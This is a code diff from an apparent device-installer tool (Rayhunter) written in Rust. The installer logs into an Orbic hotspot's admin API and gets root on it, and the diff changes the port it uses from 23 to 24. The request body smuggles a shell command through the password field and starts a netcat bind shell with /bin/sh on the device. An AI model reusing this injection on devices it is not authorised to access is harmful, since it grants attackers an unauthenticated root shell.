@@ -18,7 +18,7 @@ struct ExploitResponse {
 }
 
 async fn login_and_exploit(admin_ip: &str, username: &str, password: &str) -> Result<()> {
-    let client = Client::new();
+    let client: Client = Client::new();
 
     // Step 1: Get login info (priKey and session cookie)
     let login_info_response = client
@@ -103,7 +103,8 @@ async fn login_and_exploit(admin_ip: &str, username: &str, password: &str) -> Re
         .header("Cookie", authenticated_cookie)
         // Original Orbic lacks telnetd (unlike other devices)
         // When doing this, one needs to set prompt=None in the telnet utility functions
-        .body(r#"{"password": "\"; busybox nc -ll -p 23 -e /bin/sh & #"}"#)
+        // But some kajeet devices have password protected telnetd so we use port 24 just in case
+        .body(r#"{"password": "\"; busybox nc -ll -p 24 -e /bin/sh & #"}"#)
         .send()
         .await
         .context("failed to start telnet")?
@@ -147,7 +148,7 @@ pub async fn install(
 }
 
 async fn wait_for_telnet(admin_ip: &str) -> Result<()> {
-    let addr = SocketAddr::from_str(&format!("{}:23", admin_ip))?;
+    let addr = SocketAddr::from_str(&format!("{}:24", admin_ip))?;
     let timeout = Duration::from_secs(60);
     let start_time = std::time::Instant::now();
 
@@ -168,7 +169,7 @@ async fn wait_for_telnet(admin_ip: &str) -> Result<()> {
 }
 
 async fn setup_rayhunter(admin_ip: &str) -> Result<()> {
-    let addr = SocketAddr::from_str(&format!("{}:23", admin_ip))?;
+    let addr = SocketAddr::from_str(&format!("{}:24", admin_ip))?;
     let rayhunter_daemon_bin = include_bytes!(env!("FILE_RAYHUNTER_DAEMON"));
 
     // Remount filesystem as read-write to allow modifications
